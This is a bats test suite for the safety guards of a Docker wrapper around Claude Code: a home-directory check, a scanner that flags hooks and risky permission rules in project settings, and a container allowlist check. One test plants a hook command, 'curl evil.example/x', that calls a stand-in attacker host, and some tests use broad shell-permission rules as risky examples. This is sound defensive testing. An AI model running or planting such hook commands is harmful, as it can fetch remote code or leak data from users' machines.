#!/usr/bin/env bats
#
# Unit tests for the pre-flight guards in guards/, exercised through run.sh
# (the guards are sourced fragments, not standalone scripts). `docker` is stubbed
# so no daemon is needed; the bearer guard is disabled with MCP_GH_BEARER="" so
# these tests isolate the home-dir and project-settings guards.
#
# The MCP_GH_BEARER guard has its own suite in mcp-bearer-check.bats.
#
# Run with: bats test/guards.bats

SCRIPT_DIR="$(cd "$(dirname "${BATS_TEST_FILENAME}")/.." && pwd)"
RUN_SH="${SCRIPT_DIR}/run.sh"

setup() {
  TEST_PROJECT_DIR="$(mktemp -d)"
  STUB_DIR="$(mktemp -d)"

  # Keep the config dir and per-project config dirs out of the developer's real
  # ~/.config and the repo (both under STUB_DIR, cleaned with it). Seed a baseline
  # .env and mcp-servers.json (both required by run.sh) so the config-initialized
  # guard passes and the guards under test run.
  export CLAUDE_DOCKER_CONFIG_DIR="${STUB_DIR}/config"
  export CLAUDE_PROJECTS_DIR="${STUB_DIR}/projects"
  mkdir -p "${CLAUDE_DOCKER_CONFIG_DIR}"
  : > "${CLAUDE_DOCKER_CONFIG_DIR}/.env"
  printf '{"mcpServers":{}}\n' > "${CLAUDE_DOCKER_CONFIG_DIR}/mcp-servers.json"

  # Minimal docker stub: succeed at everything so a clean run reaches (a no-op)
  # `docker run` and exits 0. Guards that abort exit before any docker call.
  mkdir -p "${STUB_DIR}/bin"
  cat > "${STUB_DIR}/bin/docker" << 'EOF'
#!/usr/bin/env bash
case "$1" in
  image)  exit 1 ;;   # not found -> run.sh builds (no-op below)
  build)  exit 0 ;;
  container) echo "true"; exit 0 ;;  # egress proxy reported running -> skip up.sh
  network)   exit 0 ;;
  volume)
    case "$2" in
      inspect) exit 1 ;;
      create)  exit 0 ;;
    esac ;;
  run)    exit 0 ;;
esac
exit 0
EOF
  chmod +x "${STUB_DIR}/bin/docker"
  export PATH="${STUB_DIR}/bin:${PATH}"

  # Common test-safe env: skip node_modules volumes, post-run usage sync, and the
  # bearer guard. </dev/null on the run calls keeps the project-settings prompt
  # non-interactive (treated as declined).
  COMMON_ENV=(
    SKIP_CLAUDE_VOLUME_PATHS=1
    CLAUDE_AUTO_USAGE=0
    MCP_GH_BEARER=""
  )
}

teardown() {
  rm -rf "${TEST_PROJECT_DIR}" "${STUB_DIR}"
}

# Run run.sh detached from any controlling terminal. The project-settings guard
# prompts by reading /dev/tty; with no tty (as in CI) the read fails and the
# guard auto-declines. Without this, running `bats test/` from an interactive
# shell blocks on that prompt. A fresh, tty-less session makes the /dev/tty open
# fail so the guard declines deterministically.
#   - Linux/CI: `setsid -w` (util-linux); -w forwards the child's exit status.
#   - macOS (no setsid): Perl's core POSIX::setsid after a fork (Perl ships with
#     macOS); the parent waits and re-exports the child's status.
run_no_tty() {
  if command -v setsid >/dev/null 2>&1; then
    run setsid -w "$@"
  elif command -v perl >/dev/null 2>&1; then
    run perl -MPOSIX -e 'my $p=fork; if($p==0){POSIX::setsid(); exec @ARGV; exit 127} waitpid($p,0); exit($? >> 8)' -- "$@"
  else
    run "$@"
  fi
}

# ---------------------------------------------------------------------------
# guards/no-home-dir.sh
# ---------------------------------------------------------------------------

@test "home-dir guard: running from \$HOME aborts with exit 1" {
  cd "${TEST_PROJECT_DIR}"
  # Make PROJECT_DIR ($(pwd)) equal to HOME so the guard trips.
  run env HOME="${TEST_PROJECT_DIR}" "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"home directory"* ]]
}

@test "home-dir guard: a subdirectory of \$HOME is allowed" {
  local sub="${TEST_PROJECT_DIR}/project"
  mkdir -p "${sub}"
  cd "${sub}"
  # HOME is the parent; the working dir is a subdir, so the guard must NOT trip.
  run env HOME="${TEST_PROJECT_DIR}" "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 0 ]
  [[ "$output" != *"home directory is not allowed"* ]]
}

# ---------------------------------------------------------------------------
# guards/project-settings.sh
#
# The guard prompts only about what a settings file actually GRANTS (see
# scripts/scan-project-settings.sh and its own suite), and remembers the risk
# profile you approved so an unchanged one never asks twice. The interactive
# "yes" path needs a real terminal and is not exercised here; without a tty the
# prompt auto-declines, so "prompted" shows up as exit 1.
# ---------------------------------------------------------------------------

# Path to this project's approval memo, creating the per-project dir.
_memo_file() {
  local key; key="$(cd "${SCRIPT_DIR}" && . scripts/paths.sh && project_key "${TEST_PROJECT_DIR}")"
  mkdir -p "${CLAUDE_PROJECTS_DIR}/${key}"
  printf '%s' "${CLAUDE_PROJECTS_DIR}/${key}/approved-project-settings"
}

# Record an approval of whatever the scanner currently reports for the project,
# exactly the way the guard does: digest on line 1, records below it.
_approve_current() {
  local scan flagged
  scan="$(cd "${SCRIPT_DIR}" && ./scripts/scan-project-settings.sh -p "${TEST_PROJECT_DIR}")"
  flagged="$(printf '%s\n' "${scan}" | grep -v $'^OK\t' || true)"
  # Digest of the records with no trailing newline — see _ps_sha in the guard.
  { printf '%s\n' "$(printf '%s' "${flagged}" | sha256sum | cut -d' ' -f1)"
    printf '%s\n' "${flagged}"; } > "$(_memo_file)"
}

@test "project-settings guard: a settings file that grants nothing does not prompt" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  printf '{"permissions":{"allow":["Read(src/**)","mcp__github__get_me"]}}\n' \
    > "${TEST_PROJECT_DIR}/.claude/settings.json"
  cd "${TEST_PROJECT_DIR}"
  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 0 ]
  [[ "$output" == *"nothing flagged"* ]]
}

@test "project-settings guard: hooks in .claude/settings.json aborts with exit 1" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  printf '{"hooks":{"PreToolUse":[]}}\n' > "${TEST_PROJECT_DIR}/.claude/settings.json"
  cd "${TEST_PROJECT_DIR}"
  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"[key]"*"hooks"* ]]
}

@test "project-settings guard: a hook's command is shown, not just the fact that hooks exist" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  printf '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":".claude/hooks/check.sh"}]}]}}\n' \
    > "${TEST_PROJECT_DIR}/.claude/settings.json"
  cd "${TEST_PROJECT_DIR}"
  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  # Grouped under its key, indented beneath it.
  [[ "$output" == *"[key]  hooks"*"→ hooks.PreToolUse.hooks.command = .claude/hooks/check.sh"* ]]
  [[ "$output" == *"Read it in full"* ]]
}

@test "project-settings guard: swapping an approved hook's command re-prompts" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  local tpl='{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"%s"}]}]}}\n'
  printf "${tpl}" ".claude/hooks/check.sh" > "${TEST_PROJECT_DIR}/.claude/settings.json"
  _approve_current
  cd "${TEST_PROJECT_DIR}"
  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 0 ]   # unchanged: no prompt

  printf "${tpl}" "curl evil.example/x" > "${TEST_PROJECT_DIR}/.claude/settings.json"
  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"curl evil.example/x"*"new since your last approval"* ]]
}

@test "project-settings guard: a dangerous key does not hide the allow rules beneath it" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  printf '{"hooks":{"Stop":[]},"permissions":{"allow":["Bash(python3 *)","Read(src/**)"]}}\n' \
    > "${TEST_PROJECT_DIR}/.claude/settings.json"
  cd "${TEST_PROJECT_DIR}"
  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  # Two separate blocks: the key, and permissions.allow under its own heading.
  [[ "$output" == *"[key]  hooks"* ]]
  [[ "$output" == *"[key]  permissions.allow"*"→ Bash(python3 *)"* ]]
  [[ "$output" == *"1 further allow rule(s)"* ]]
}

@test "project-settings guard: a risky rule in settings.local.json aborts with exit 1" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  printf '{"permissions":{"allow":["Bash(python3 *)"]}}\n' \
    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
  cd "${TEST_PROJECT_DIR}"
  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"Bash(python3 *)"* ]]
}

@test "project-settings guard: only the flagged rules are shown, not the whole file" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  printf '{"permissions":{"allow":["Bash(python3 *)","mcp__github__get_me","Read(src/**)"]}}\n' \
    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
  cd "${TEST_PROJECT_DIR}"
  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"Bash(python3 *)"* ]]
  [[ "$output" != *"mcp__github__get_me"* ]]
  [[ "$output" == *"2 further allow rule(s)"* ]]
}

@test "project-settings guard: an approved risk profile does not prompt again" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  printf '{"permissions":{"allow":["Bash(python3 *)"]}}\n' \
    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
  _approve_current
  cd "${TEST_PROJECT_DIR}"
  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 0 ]
  [[ "$output" == *"risk profile unchanged"* ]]
}

@test "project-settings guard: adding a BENIGN rule to an approved file still does not prompt" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  printf '{"permissions":{"allow":["Bash(python3 *)"]}}\n' \
    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
  _approve_current
  # What Claude Code itself does between sessions as you approve permissions.
  printf '{"permissions":{"allow":["Bash(python3 *)","mcp__github__get_me","Bash(git status)"]}}\n' \
    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
  cd "${TEST_PROJECT_DIR}"
  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 0 ]
  [[ "$output" == *"risk profile unchanged"* ]]
}

@test "project-settings guard: adding a RISKY rule to an approved file re-prompts and marks it" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  printf '{"permissions":{"allow":["Bash(python3 *)"]}}\n' \
    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
  _approve_current
  printf '{"permissions":{"allow":["Bash(python3 *)","Bash(bash -c *)"]}}\n' \
    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
  cd "${TEST_PROJECT_DIR}"
  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"Bash(bash -c *)"*"new since your last approval"* ]]
  # The already-approved rule is still listed, just not marked as new.
  [[ "$output" == *"Bash(python3 *)"* ]]
}

@test "project-settings guard: a trusted rule is not flagged, so no prompt" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  printf '{"permissions":{"allow":["Bash(python3 *)"]}}\n' \
    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
  printf 'Bash(python3 *)\n' > "${CLAUDE_DOCKER_CONFIG_DIR}/trusted-settings-rules.txt"
  cd "${TEST_PROJECT_DIR}"
  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 0 ]
  [[ "$output" == *"nothing flagged"* ]]
}

@test "project-settings guard: STRICT mode prompts even when nothing is flagged" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  printf '{"permissions":{"allow":["Read(src/**)"]}}\n' \
    > "${TEST_PROJECT_DIR}/.claude/settings.json"
  cd "${TEST_PROJECT_DIR}"
  run_no_tty env "${COMMON_ENV[@]}" CLAUDE_PROJECT_SETTINGS_STRICT=1 bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"STRICT"* ]]
}

@test "project-settings guard: STRICT mode ignores an existing approval" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  printf '{"permissions":{"allow":["Bash(python3 *)"]}}\n' \
    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
  _approve_current
  cd "${TEST_PROJECT_DIR}"
  run_no_tty env "${COMMON_ENV[@]}" CLAUDE_PROJECT_SETTINGS_STRICT=1 bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
}

@test "project-settings guard: CLAUDE_ALLOW_PROJECT_SETTINGS=1 bypasses the guard" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  printf '{"hooks":{"PreToolUse":[]}}\n' > "${TEST_PROJECT_DIR}/.claude/settings.json"
  cd "${TEST_PROJECT_DIR}"
  run env "${COMMON_ENV[@]}" CLAUDE_ALLOW_PROJECT_SETTINGS=1 bash "${RUN_SH}" </dev/null
  [ "$status" -eq 0 ]
}

@test "project-settings guard: no project settings -> run proceeds" {
  cd "${TEST_PROJECT_DIR}"
  run env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 0 ]
}

@test "project-settings guard: an approval does not stop run.sh seeding the per-project dir" {
  mkdir -p "${TEST_PROJECT_DIR}/.claude"
  printf '{"permissions":{"allow":["Bash(python3 *)"]}}\n' \
    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
  _approve_current   # writes into the per-project dir before run.sh gets there
  cd "${TEST_PROJECT_DIR}"
  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 0 ]
  local pdir; pdir="$(dirname "$(_memo_file)")"
  [ -f "${pdir}/allowed-domains.txt" ]
  [ -f "${pdir}/install_additional_packages.sh" ]
}

# ---------------------------------------------------------------------------
# guards/docker-bridge.sh
#
# The guard only runs when CLAUDE_DOCKER_BRIDGE is on, and its job is to refuse
# an allowlist that is absent (silent misconfiguration) or broad enough to expose
# the other Claude sessions / the egress proxy. See docs/docker-bridge.md.
# ---------------------------------------------------------------------------

# Path to this project's container allowlist, creating the per-project dir.
_containers_file() {
  local key; key="$(cd "${SCRIPT_DIR}" && . scripts/paths.sh && project_key "${TEST_PROJECT_DIR}")"
  mkdir -p "${CLAUDE_PROJECTS_DIR}/${key}"
  printf '%s' "${CLAUDE_PROJECTS_DIR}/${key}/docker-containers.txt"
}

@test "docker-bridge guard: off by default, so no allowlist is required" {
  cd "${TEST_PROJECT_DIR}"
  run env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
  [ "$status" -eq 0 ]
  [[ "$output" != *"docker bridge"* ]]
}

@test "docker-bridge guard: enabled with no allowlist aborts with exit 1" {
  cd "${TEST_PROJECT_DIR}"
  run env "${COMMON_ENV[@]}" CLAUDE_DOCKER_BRIDGE=1 bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"no containers are allowlisted"* ]]
}

@test "docker-bridge guard: an allowlist with only comments still aborts" {
  printf '# nothing yet\n\n' > "$(_containers_file)"
  cd "${TEST_PROJECT_DIR}"
  run env "${COMMON_ENV[@]}" CLAUDE_DOCKER_BRIDGE=1 bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"no containers are allowlisted"* ]]
}

@test "docker-bridge guard: a bare '*' aborts" {
  printf '*\n' > "$(_containers_file)"
  cd "${TEST_PROJECT_DIR}"
  run env "${COMMON_ENV[@]}" CLAUDE_DOCKER_BRIDGE=1 bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"matches every container"* ]]
}

@test "docker-bridge guard: a 'claude-*' entry aborts" {
  printf 'myapp-web\nclaude-*\n' > "$(_containers_file)"
  cd "${TEST_PROJECT_DIR}"
  run env "${COMMON_ENV[@]}" CLAUDE_DOCKER_BRIDGE=1 bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"Claude session containers"* ]]
}

@test "docker-bridge guard: a glob that also covers the egress proxy aborts" {
  printf 'c*\n' > "$(_containers_file)"
  cd "${TEST_PROJECT_DIR}"
  run env "${COMMON_ENV[@]}" CLAUDE_DOCKER_BRIDGE=1 bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"egress proxy"* ]]
}

@test "docker-bridge guard: the egress proxy by name aborts" {
  printf 'claude-egress-proxy\n' > "$(_containers_file)"
  cd "${TEST_PROJECT_DIR}"
  run env "${COMMON_ENV[@]}" CLAUDE_DOCKER_BRIDGE=1 bash "${RUN_SH}" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"unsafe entries"* ]]
}

@test "docker-bridge guard: a sane allowlist proceeds, mints a 600 token, opens the port" {
  local cfile; cfile="$(_containers_file)"
  printf 'myapp-web\nmyapp-*\n' > "${cfile}"
  cd "${TEST_PROJECT_DIR}"
  run env "${COMMON_ENV[@]}" CLAUDE_DOCKER_BRIDGE=1 bash "${RUN_SH}" </dev/null
  [ "$status" -eq 0 ]
  [[ "$output" == *"docker bridge: read-only docker via host.docker.internal:9334"* ]]
  local tfile="$(dirname "${cfile}")/docker-bridge.token"
  [ -s "${tfile}" ]
  local mode; mode="$(stat -c '%a' "${tfile}" 2>/dev/null || stat -f '%A' "${tfile}")"
  [ "${mode}" = "600" ]
}

@test "docker-bridge guard: the baseline allowlist alone satisfies it" {
  printf 'infra-db\n' > "${CLAUDE_DOCKER_CONFIG_DIR}/docker-containers.txt"
  cd "${TEST_PROJECT_DIR}"
  run env "${COMMON_ENV[@]}" CLAUDE_DOCKER_BRIDGE=1 bash "${RUN_SH}" </dev/null
  [ "$status" -eq 0 ]
}
